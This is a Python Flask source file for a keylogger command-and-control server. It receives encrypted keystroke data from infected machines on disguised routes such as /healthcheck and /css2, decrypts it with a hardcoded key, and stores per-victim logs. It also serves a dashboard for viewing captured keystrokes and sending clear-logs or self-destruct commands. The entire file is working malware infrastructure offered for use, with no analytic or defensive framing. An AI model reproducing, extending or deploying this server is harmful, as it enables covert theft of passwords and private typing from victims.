#!/usr/bin/env python3
import os
import base64
import logging
import json
import threading
import argparse
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ───────────────────────────────── CONFIGURATION ─────────────────────────────────

LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)

app = Flask(__name__)
clients = {}

# Hardcoded master key must match derivation logic in keylogger
MASTER_KEY = b'\x8d\x23\x4e\x5f\x90\xab\xcd\xef\x12\x34\x56\x78\x90\xab\xcd\xef\x12\x34\x56\x78\x90\xab\xcd\xef\x12\x34\x56\x78\x90\xab\xcd\xef'  # Replace with actual derived key from keylogger system entropy if needed

HTML_PANEL = '''
<!doctype html>
<html><head><title>Keylogger C2 Panel</title></head>
<body>
<h2>C2 Dashboard</h2>
<ul>
{% for client_id, info in clients.items() %}
    <li>
        ID: {{ client_id }} |
        Last Seen: {{ info.last_seen }} |
        <a href="/logs/{{ client_id }}">View Logs</a> |
        <a href="/cmd/{{ client_id }}/clear-logs">Clear Logs</a> |
        <a href="/cmd/{{ client_id }}/self-destruct" style="color:red;">Self Destruct</a>
    </li>
{% endfor %}
</ul>
</body></html>
'''

# ───────────────────────────────── HELPERS ─────────────────────────────────

def decrypt_data(encrypted_data: str) -> bytes:
    try:
        raw = base64.b64decode(encrypted_data)
        nonce, ciphertext = raw[:12], raw[12:]
        aesgcm = AESGCM(MASTER_KEY)
        return aesgcm.decrypt(nonce, ciphertext, None)
    except Exception as e:
        logging.warning(f"[DECRYPT FAIL] {e}")
        return b''

# ───────────────────────────────── ROUTES ─────────────────────────────────

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_PANEL, clients=clients)

@app.route("/healthcheck", methods=["POST"])
@app.route("/config", methods=["POST"])
@app.route("/css2", methods=["POST"])
def beacon():
    try:
        data = request.get_json()
        client_id = data.get("id")
        encrypted_payload = data.get("data")
        timestamp = data.get("ts")

        if not all([client_id, encrypted_payload, timestamp]):
            return jsonify({"error": "Missing fields"}), 400

        plaintext = decrypt_data(encrypted_payload)
        log_file = LOG_DIR / f"{client_id}.log"
        with open(log_file, "ab") as f:
            f.write(plaintext + b"\n---\n")

        clients[client_id] = {
            "last_seen": datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
        }

        # Optional command response
        cmd = None
        if os.path.exists(f"cmd/{client_id}.cmd"):
            with open(f"cmd/{client_id}.cmd", "r") as f:
                cmd = f.read().strip()
            os.remove(f"cmd/{client_id}.cmd")

        return jsonify({"cmd": cmd}) if cmd else '', 200

    except Exception as e:
        logging.error(f"[BEACON ERR] {e}")
        return jsonify({"error": "Internal Error"}), 500

@app.route("/logs/<client_id>")
def view_logs(client_id):
    log_path = LOG_DIR / f"{client_id}.log"
    if log_path.exists():
        return '<pre>' + log_path.read_text() + '</pre>'
    return "No logs found.", 404

@app.route("/cmd/<client_id>/<command>")
def send_command(client_id, command):
    if command not in ["clear-logs", "self-destruct"]:
        return "Invalid command.", 400

    cmd_dir = Path("cmd")
    cmd_dir.mkdir(exist_ok=True)
    cmd_file = cmd_dir / f"{client_id}.cmd"
    cmd_file.write_text(command)
    return f"Sent '{command}' to {client_id}. Refresh client to execute."

# ───────────────────────────────── MAIN ─────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
    parser.add_argument("--port", type=int, default=443, help="HTTPS port")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    print(f"[+] Starting C2 server on https://{args.host}:{args.port}")
    app.run(host=args.host, port=args.port, ssl_context=('cert.pem', 'key.pem'), debug=args.debug)